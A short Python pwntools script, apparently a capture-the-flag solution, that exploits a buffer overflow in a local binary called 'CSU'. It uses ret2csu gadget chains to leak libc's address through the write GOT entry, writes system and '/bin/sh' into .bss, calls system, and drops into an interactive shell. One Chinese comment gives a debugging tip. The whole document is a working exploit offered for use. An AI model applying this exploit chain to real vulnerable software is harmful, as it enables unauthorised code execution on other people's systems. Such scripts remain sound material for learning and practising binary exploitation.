from pwn import *

s = process("./CSU")
elf = ELF("./CSU")
context(log_level='debug', arch='amd64', os='linux')


def csu(rdi, rsi, rdx, func):
    payload = p64(0x400606)  # csu_start
    payload += flat('A' * 8, 0, 1, func, rdi, rsi, rdx)
    payload += p64(0x4005F0)  # csu_exec
    payload += b'A' * 0x38
    return payload


gdb.attach(s, "b *0x400563\nc")
payload = flat('A' * 0x60, 0, csu(1, elf.got['write'], 8, elf.got['write']))
payload += csu(0, elf.bss(0x500), 0x100, elf.got['read'])
payload += csu(elf.bss(0x500) + 8, 0, 0, elf.bss(0x500))[:-8] # 如果 call    qword ptr [r12+rbx*8] 这里不是 system 调试一下。多了8个字节就删除掉
s.send(payload)

libc = ELF("./libc-2.23.so")
libc.address = u64(s.recvuntil("\x7f")[-6:] + b"\x00\x00") - libc.sym['write']
success(hex(libc.address))

# raw_input(">")
payload = p64(libc.sym['system']) + b"/bin/sh\x00"
s.send(payload)

s.interactive()
